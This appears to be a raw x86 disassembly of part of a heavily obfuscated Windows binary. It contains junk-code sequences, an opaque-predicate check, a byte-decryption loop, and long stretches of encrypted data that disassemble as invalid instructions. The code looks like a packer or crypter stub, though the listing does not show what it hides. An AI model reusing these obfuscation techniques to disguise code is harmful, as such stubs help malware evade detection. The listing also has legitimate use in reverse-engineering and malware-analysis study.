  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422598
  416605:	mov    edi,0x4224de
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422598
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x69096e70]
  416729:	mov    esp,0x1816fc77
  41672e:	fwait
  41672f:	adc    al,0x18
  416731:	sbb    BYTE PTR [eax],ch
  416733:	sahf   
  416734:	push   ecx
  416735:	(bad)  
  416737:	mov    ds:0x7b89c1f3,eax
  41673c:	nop
  41673d:	push   ebp
  41673e:	(bad)  
  41673f:	xor    edx,esp
  416741:	pop    ebx
  416742:	push   es
  416743:	iret   
  416744:	push   ds
  416745:	in     eax,0x9c
  416747:	repnz test eax,0x8aac6e13
  41674d:	pop    edi
  41674e:	inc    edx
  41674f:	daa    
  416750:	in     eax,dx
  416751:	cmp    al,0x80
  416753:	clc    
  416754:	addr16 mov bh,0x9a
  416757:	push   ecx
  416758:	mov    cl,dl
  41675a:	ret    
  41675b:	lahf   
  41675c:	sub    ecx,DWORD PTR [ebx+0x2cf8b6a1]
  416762:	jnp    0x4167a6
  416764:	mov    dl,0xe4
  416766:	jns    0x416723
  416768:	mov    bl,0x4c
  41676a:	xchg   edx,eax
  41676b:	push   edi
  41676c:	lock fbld TBYTE PTR [eax-0x7c]
  416770:	(bad)  
  416771:	mov    ebx,0x9ee5fa51
  416776:	xchg   esi,eax
  416777:	imul   edi,ecx,0x81dffab5
  41677d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41677e:	jl     0x416768
  416780:	mov    ds:0x9847898f,eax
  416785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416786:	xlat   BYTE PTR ds:[ebx]
  416787:	loopne 0x4167db
  416789:	ins    BYTE PTR es:[edi],dx
  41678a:	ret    
  41678b:	inc    esp
  41678c:	cmp    BYTE PTR [esi+0x526897e9],dl
  416792:	push   cs
  416793:	pop    edi
  416794:	add    ebp,DWORD PTR [edi]
  416796:	jge    0x416767
  416798:	sahf   
  416799:	ror    DWORD PTR [eax*2+0x2d6d5716],1
  4167a0:	lds    ecx,FWORD PTR [esi+ebx*1+0x2069838f]
  4167a7:	add    eax,0xee450d0f
  4167ac:	cdq    
  4167ad:	jle    0x41682b
  4167af:	fwait
  4167b0:	(bad)  
  4167b3:	and    eax,0xa7a672a3
  4167b8:	pusha  
  4167b9:	push   edi
  4167ba:	push   es
  4167bb:	(bad)  
  4167bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167bd:	fwait
  4167be:	loop   0x416802
  4167c0:	mov    bl,BYTE PTR [edx]
  4167c2:	xor    BYTE PTR [edx],dh
  4167c4:	sti    
  4167c5:	jmp    0x4167e0
  4167c7:	xor    al,0xe6
  4167c9:	test   BYTE PTR [esi-0x59e36ec2],0x8b
  4167d0:	and    al,0xc1
  4167d2:	gs call 0xf9012b81
  4167d8:	sub    eax,0xac1f1b9f
  4167dd:	ror    DWORD PTR [esi],1
  4167df:	fld    QWORD PTR gs:[ebx-0x1f]
  4167e3:	pop    ebx
  4167e4:	imul   eax,DWORD PTR [edi+0x6829d609],0x89c1a4e7
  4167ee:	loop   0x41686c
  4167f0:	mov    esp,0x6d9b3678
  4167f5:	clc    
  4167f6:	mov    BYTE PTR [eax+0x348806c8],0xc
  4167fd:	xchg   ebx,eax
  4167fe:	ins    DWORD PTR es:[edi],dx
  4167ff:	and    BYTE PTR [edi],dh
  416801:	xor    ah,ah
  416803:	pop    ecx
  416804:	jb     0x416838
  416806:	dec    esp
  416807:	sbb    cl,dl
  416809:	scas   eax,DWORD PTR es:[edi]
  41680a:	sahf   
  41680b:	nop
  41680c:	mov    ah,0x90
  41680e:	out    dx,eax
  41680f:	out    dx,eax
  416810:	inc    eax
  416811:	lods   al,BYTE PTR ds:[esi]
  416812:	or     ebp,DWORD PTR [ebp-0x35]
  416815:	jb     0x41682d
  416817:	add    cl,BYTE PTR ds:0xee7a02b8
  41681d:	add    DWORD PTR [ebp+0x45],0xffffffe9
  416821:	inc    edx
  416822:	fldcw  WORD PTR [edi-0x56cdad3f]
  416828:	pushf  
  416829:	pusha  
  41682a:	retf   
  41682b:	(bad)  
  41682c:	mov    ah,0xda
  41682e:	(bad)  
  41682f:	or     ecx,DWORD PTR [esp+edi*4-0x46]
  416833:	xchg   esp,eax
  416834:	(bad)  
  416835:	jecxz  0x4167da
  416837:	out    0x61,eax
  416839:	or     al,0xcd
  41683b:	xchg   edi,eax
  41683c:	sbb    al,0x71
  41683e:	imul   esp,DWORD PTR ds:0x733f4ff4,0xfffffff3
  416845:	stc    
  416846:	in     al,dx
  416847:	mov    edx,0xb70cd0c1
  41684c:	add    DWORD PTR [edx+eax*8+0x1cb4f7a9],eax
  416853:	pop    eax
  416854:	mov    ds:0x626bd171,eax
  416859:	call   0xd24d:0xd1b1944a
  416860:	test   al,dl
  416862:	fwait
  416863:	ins    BYTE PTR es:[edi],dx
  416864:	cmc    
  416865:	cmc    
  416866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416867:	pusha  
  416868:	jo     0x416842
  41686a:	mov    al,ds:0xb2d7bc6b
  41686f:	xor    dh,BYTE PTR [ecx+0x72]
  416872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416873:	inc    ebx
  416874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416875:	mov    edx,0xcc264a05
  41687a:	lods   eax,DWORD PTR ds:[esi]
  41687b:	enter  0x1485,0x3a
  41687f:	pop    ebx
  416880:	outs   dx,DWORD PTR ds:[esi]
  416881:	paddusb mm1,QWORD PTR [ebx]
  416884:	lods   al,BYTE PTR ds:[esi]
  416885:	jge    0x416891
  416887:	sub    bl,BYTE PTR [edx-0x12e37690]
  41688d:	adc    al,0xc9
  41688f:	or     BYTE PTR ds:0x5f9e93b9,0xf5
  416896:	push   es
  416897:	push   esi
  416898:	mov    ebx,0xa2da2e2c
  41689d:	hlt    
  41689e:	xchg   BYTE PTR [eax],ah
  4168a0:	push   ss
  4168a1:	(bad)  
  4168a2:	les    ebp,FWORD PTR [esi]
  4168a4:	mov    edx,0xbd807996
  4168a9:	pop    ecx
  4168aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ac:	imul   ecx,DWORD PTR [ebp+ecx*8+0x6c5bed27],0xb6ac686c
  4168b7:	std    
  4168b8:	mov    ds:0x7cc9f905,al
  4168bd:	ins    BYTE PTR es:[edi],dx
  4168be:	fisubr WORD PTR [esi]
  4168c0:	xor    DWORD PTR [eax-0x1],0x44
  4168c4:	pop    eax
  4168c5:	jne    0x416881
  4168c7:	sub    al,0x14
  4168c9:	fs aaa 
  4168cb:	in     al,dx
  4168cc:	pop    esi
  4168cd:	in     al,dx
  4168ce:	jbe    0x416905
  4168d0:	dec    BYTE PTR [esi+0x61ad5fbd]
  4168d6:	push   0x1d
  4168d8:	arpl   sp,bp
  4168da:	inc    edx
  4168db:	jo     0x416898
  4168dd:	pop    ecx
  4168de:	jmp    0xf1454eb1
  4168e3:	repnz stc 
  4168e5:	sbb    eax,0xeb15fe24
  4168ea:	icebp  
  4168eb:	sar    DWORD PTR ds:0xacdc5ba1,cl
  4168f1:	push   eax
  4168f2:	mov    ds:0x38c69217,eax
  4168f7:	aaa    
  4168f8:	xchg   ebp,eax
  4168f9:	cdq    
  4168fa:	mov    eax,0x4de35d33
  4168ff:	mov    BYTE PTR [edi],bh
  416901:	xor    ebx,DWORD PTR [edx-0x49]
  416904:	xor    BYTE PTR [edx],dl
  416906:	push   esp
  416907:	pop    es
  416908:	jmp    0x41740419
  41690d:	mov    ds:0x91eb1b98,al
  416912:	shl    ch,1
  416914:	mov    ds,WORD PTR ss:[eax]
  416917:	shl    ebx,0x93
  41691a:	ins    BYTE PTR es:[edi],dx
  41691b:	imul   ebp,DWORD PTR [esi+0x7e528a2],0xf22af5fe
  416925:	stos   BYTE PTR es:[edi],al
  416926:	clc    
  416927:	fistp  QWORD PTR [ecx-0x72f851ba]
  41692d:	aam    0x53
  41692f:	inc    ebp
  416930:	xor    eax,0xf5472808
  416935:	jmp    FWORD PTR [ebp-0x54]
  416938:	adc    eax,0x3933064
  41693d:	or     esi,ebx
  41693f:	inc    esi
  416940:	or     al,BYTE PTR [ecx-0x1b]
  416943:	aaa    
  416944:	test   BYTE PTR [esi-0x19],ah
  416947:	mov    al,ds:0x2b26a704
  41694c:	jnp    0x41695e
  41694e:	gs icebp 
  416950:	adc    ch,BYTE PTR [eax+ecx*2+0x61]
  416954:	cmp    DWORD PTR [eax+eax*1-0x12],0xffffff90
  416959:	mov    ds:0x62965339,al
  41695e:	pop    ds
  41695f:	sbb    BYTE PTR [esi],0x4a
  416962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416963:	sbb    cl,BYTE PTR [edi-0x44]
  416966:	pushf  
  416967:	pop    ds
  416968:	push   0x6ba5e177
  41696d:	fistp  DWORD PTR [ebx-0x46]
  416970:	frstor [eax+0x46]
  416973:	enter  0x8dd7,0x45
  416977:	(bad)  
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xaae7191a
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx+0x79181814],bl
  4169ac:	ficomp WORD PTR [ecx+0x29]
  4169af:	mov    ah,0xa0
  4169b1:	ja     0x4169ce
  4169b3:	leave  
  4169b4:	shr    edx,1
  4169b6:	sahf   
  4169b7:	das    
  4169b8:	out    0x2e,eax
  4169ba:	mov    ecx,0x79c5a5ac
  4169bf:	mov    ebp,0x4f1fa6b6
  4169c4:	add    DWORD PTR [edi-0xa],esp
  4169c7:	les    ebx,FWORD PTR [ebp-0x6bd52726]
  4169cd:	mov    ds,WORD PTR [edx-0x74]
  4169d0:	push   edi
  4169d1:	sbb    ebp,DWORD PTR [edi+0x18]
  4169d4:	sub    al,0xa2
  4169d6:	out    dx,eax
  4169d7:	inc    ebp
  4169d8:	pop    ecx
  4169d9:	push   esp
  4169da:	and    dh,BYTE PTR [ebx-0x30]
  4169dd:	jns    0x416a50
  4169df:	sub    dh,BYTE PTR [esi]
  4169e1:	pop    es
  4169e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e3:	mov    edx,0x6d82dd5a
  4169e8:	(bad)  
  4169e9:	popf   
  4169ea:	and    bh,BYTE PTR [ecx-0x4e]
  4169ed:	sti    
  4169ee:	icebp  
  4169ef:	push   esi
  4169f0:	inc    edi
  4169f1:	mov    ch,0x2f
  4169f3:	rcr    bh,0x64
  4169f6:	fadd   QWORD PTR [ebx]
  4169f8:	idiv   BYTE PTR [edx]
  4169fa:	push   edi
  4169fb:	mov    ecx,0x6e39c043
  416a00:	mov    dh,0x3a
  416a02:	aas    
  416a03:	nop
  416a04:	push   ebx
  416a05:	loop   0x4169e0
  416a07:	aad    0x4a
  416a09:	push   0xdcbaab7
  416a0e:	sbb    al,0x5f
  416a10:	retf   
  416a11:	push   0xfffffff8
  416a13:	xchg   esp,eax
  416a14:	add    edx,eax
  416a16:	mov    esp,DWORD PTR [ecx]
  416a18:	mov    ecx,0x2fc4f0b8
  416a1d:	dec    edi
  416a1e:	cmp    bh,BYTE PTR ds:0x61cd9037
  416a24:	imul   esi,DWORD PTR [ecx],0xffffff9d
  416a27:	inc    ecx
  416a28:	aad    0xa0
  416a2a:	sbb    eax,0x5a1837a7
  416a2f:	xchg   edi,eax
  416a30:	loope  0x416a7c
  416a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a33:	sub    ch,ah
  416a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a36:	mov    DWORD PTR [ebx-0x40339f23],0x99cb3769
  416a40:	mov    eax,ds:0x9143caae
  416a45:	dec    ecx
  416a46:	test   BYTE PTR [esi+0x383a0ed4],dh
  416a4c:	sub    al,0x2d
  416a4e:	xchg   esi,eax
  416a4f:	inc    ebp
  416a50:	out    dx,al
  416a51:	xchg   esp,eax
  416a52:	cs daa 
  416a54:	(bad)  
  416a55:	mov    esp,0x3144f8f5
  416a5a:	(bad)  
  416a5b:	jp     0x4169eb
  416a5d:	mov    edx,0x924ad70e
  416a62:	inc    ebx
  416a63:	aad    0xf
  416a65:	fisub  DWORD PTR [ebx-0x6d8fdb7]
  416a6b:	lea    esp,[ebx+ebp*8-0x1bd1fdee]
  416a72:	mov    bl,0x64
  416a74:	(bad)  
  416a75:	iret   
  416a76:	pop    es
  416a77:	int3   
  416a78:	cli    
  416a79:	cdq    
  416a7a:	jne    0x416a7c
  416a7c:	cmp    bl,cl
  416a7e:	lea    edx,[ebx-0x2e9dad81]
  416a84:	jb     0x416aae
  416a86:	stos   DWORD PTR es:[edi],eax
  416a87:	not    BYTE PTR [esi-0x5ac56184]
  416a8d:	push   cs
  416a8e:	aad    0xa8
  416a90:	rdmsr  
  416a92:	fucomp st(5)
  416a94:	mul    edi
  416a96:	(bad)  
  416a97:	mov    dh,0x67
  416a99:	hlt    
  416a9a:	push   esp
  416a9b:	jg     0x416ab2
  416a9d:	lock or al,0xd5
  416aa0:	ss das 
  416aa2:	mov    ds:0x95d7a606,eax
  416aa7:	loope  0x416a35
  416aa9:	les    eax,FWORD PTR [edi+0x5a89a458]
  416aaf:	ret    
  416ab0:	imul   eax,DWORD PTR [ebp-0x29],0xffffff96
  416ab4:	fwait
  416ab5:	inc    esi
  416ab6:	add    eax,DWORD PTR [ebp-0xbcd0eba]
  416abc:	lods   al,BYTE PTR ds:[esi]
  416abd:	sahf   
  416abe:	dec    edi
  416abf:	aam    0x85
  416ac1:	xor    eax,0xee97e37e
  416ac6:	xchg   DWORD PTR [ecx],ecx
  416ac8:	imul   ebp,DWORD PTR [ebx-0x51],0xe8a93305
  416acf:	test   DWORD PTR [edx-0x32],0x31dff391
  416ad6:	aaa    
  416ad7:	popf   
  416ad8:	jmp    0xf32:0xef38493e
  416adf:	jl     0x416b4d
  416ae1:	les    edx,FWORD PTR [esi]
  416ae3:	(bad)  
  416ae4:	jno    0x416a7f
  416ae6:	push   esi
  416ae7:	repnz push 0xe745645b
  416aed:	mov    esi,0xd8dad871
  416af2:	fdiv   DWORD PTR [ecx-0x6c]
  416af5:	pusha  
  416af6:	inc    esp
  416af7:	mov    cl,0xbc
  416af9:	retf   
  416afa:	inc    edi
  416afb:	fisubr WORD PTR [ebp+0x33]
  416afe:	dec    ebx
  416aff:	mov    dh,0x63
  416b01:	and    edi,ecx
  416b03:	and    BYTE PTR [eax-0x72ce0ee0],bh
  416b09:	xor    eax,0x401c4dab
  416b0e:	mov    dh,0x4d
  416b10:	fild   DWORD PTR [eax]
  416b12:	out    dx,al
  416b13:	mov    eax,0x60eb32b9
  416b18:	(bad)  
  416b1a:	rol    BYTE PTR [edx],1
  416b1c:	mov    ch,0x6a
  416b1e:	imul   esp,DWORD PTR [ebx],0x26639e29
  416b24:	call   0x6508e5c0
  416b29:	jb     0x416af7
  416b2b:	or     esp,DWORD PTR [ebx+0x25bafd45]
  416b31:	shl    BYTE PTR cs:[ebp-0x2e6fabde],cl
  416b38:	pop    ds
  416b39:	sub    eax,0xe9170235
  416b3e:	test   al,0x7f
  416b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b41:	aad    0x3c
  416b43:	into   
  416b44:	enter  0x37b2,0xb6
  416b48:	mov    ds:0x54b77eef,eax
  416b4d:	iret   
  416b4e:	mov    eax,ds:0x62c7d677
  416b53:	sub    al,0xf5
  416b55:	daa    
  416b56:	imul   ecx,DWORD PTR [ecx],0x2c
  416b59:	and    eax,0x147f9433
  416b5e:	adc    DWORD PTR [edi],eax
  416b60:	leave  
  416b61:	fsub   DWORD PTR [edi]
  416b63:	pop    edx
  416b64:	lahf   
  416b65:	push   es
  416b66:	ins    BYTE PTR es:[edi],dx
  416b67:	pop    esp
  416b68:	mov    edx,0x254da95b
  416b6d:	loope  0x416be4
  416b6f:	cmc    
  416b70:	sub    al,0x80
  416b72:	dec    ebp
  416b73:	aam    0xf0
  416b75:	dec    edi
  416b76:	cs inc eax
  416b78:	jnp    0x416b3e
  416b7a:	xchg   ecx,eax
  416b7b:	fisubr DWORD PTR [edi+0x7d]
  416b7e:	and    al,0xb
  416b80:	lock jne 0x416bf1
  416b83:	cli    
  416b84:	inc    edi
  416b85:	pop    esi
  416b86:	es (bad) 
  416b88:	mov    esi,0xcabdf4ae
  416b8d:	push   0x10
  416b8f:	(bad)  
  416b90:	sbb    eax,0x9f7b598e
  416b95:	js     0x416b7e
  416b97:	ror    BYTE PTR [esi],1
  416b99:	cmp    dh,cl
  416b9b:	pop    esi
  416b9c:	push   0x5f55a9d7
  416ba1:	ja     0x416be9
  416ba3:	jnp    0x416bef
  416ba5:	ins    DWORD PTR es:[edi],dx
  416ba6:	cmp    dh,bh
  416ba8:	rcr    DWORD PTR [edi-0x1c],cl
  416bab:	mov    dh,0x35
  416bad:	je     0x416baa
  416baf:	dec    esp
  416bb0:	lock xchg BYTE PTR [edi-0x5394307a],bl
  416bb7:	mov    ds:0x2379d356,al
  416bbc:	scas   eax,DWORD PTR es:[edi]
  416bbd:	jmp    0x416c34
  416bbf:	dec    ecx
  416bc0:	call   0xd198:0x9a93ee13
  416bc7:	adc    DWORD PTR [esp+ebx*8-0x27394169],ebp
  416bce:	lods   eax,DWORD PTR ds:[esi]
  416bcf:	enter  0xc19a,0xb2
  416bd3:	cmp    edi,DWORD PTR [edx+eiz*4]
  416bd6:	retf   
  416bd7:	loop   0x416be1
  416bd9:	inc    edi
  416bda:	cmc    
  416bdb:	jo     0x416be2
  416bdd:	or     eax,0x44626c61
  416be2:	call   0x193bfd0f
  416be7:	je     0x416bca
  416be9:	add    esp,ebx
  416beb:	or     ebp,DWORD PTR [eax-0x2c]
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42825f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42838b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42823b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282b3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428313,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281fb
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42823f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xcf
  416d7e:	cmp    esi,ebp
  416d80:	mov    esi,0x1816f47a
  416d85:	loope  0x416d99
  416d87:	sbb    BYTE PTR [eax],bl
  416d89:	test   eax,0x6ff8735d
  416d8e:	ds popf 
  416d90:	xor    DWORD PTR [edx],0x7ec0f057
  416d96:	pop    ds
  416d97:	stos   DWORD PTR es:[edi],eax
  416d98:	add    al,0xb9
  416d9a:	out    dx,al
  416d9b:	mov    eax,0xdc4321e3
  416da0:	arpl   bx,ax
  416da2:	and    al,0xd0
  416da4:	lock add edi,DWORD PTR [ecx+0x6bfadaf4]
  416dab:	js     0x416d9f
  416dad:	fmul   DWORD PTR [esi-0x7df77a66]
  416db3:	push   0x1d
  416db5:	pop    ds
  416db6:	retf   0xe864
  416db9:	scas   al,BYTE PTR es:[edi]
  416dba:	push   ebx
  416dbb:	jp     0x416d95
  416dbd:	cld    
  416dbe:	aaa    
  416dbf:	pusha  
  416dc0:	std    
  416dc1:	adc    DWORD PTR [ebx],ecx
  416dc3:	mov    edi,0xe7ca98bf
  416dc8:	sahf   
  416dc9:	stc    
  416dca:	pop    ebp
  416dcb:	fld    DWORD PTR [edx-0x17]
  416dce:	dec    esi
  416dcf:	sti    
  416dd0:	and    DWORD PTR [ebp+0x17],0xffffffaa
  416dd4:	dec    eax
